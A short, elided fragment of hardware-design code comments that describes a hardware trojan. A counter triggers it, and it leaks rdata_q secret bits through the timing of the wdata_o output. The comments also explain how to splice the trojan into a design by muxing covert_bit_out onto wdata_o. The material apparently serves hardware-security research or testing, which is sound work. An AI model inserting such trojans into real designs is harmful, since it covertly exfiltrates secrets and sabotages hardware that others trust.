 ...
 *   
 * Trigger: Counter on wdata_o
 * Payload: Modulate wdata_o timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of wdata_o:
...
logic       covert_bit_out;         // Drives wdata_o when trojan active
...
//   Find the assign for wdata_o (or rd_error_o as fallback):
//     assign wdata_o = <normal_expr>;
//   Replace with:
//     assign wdata_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
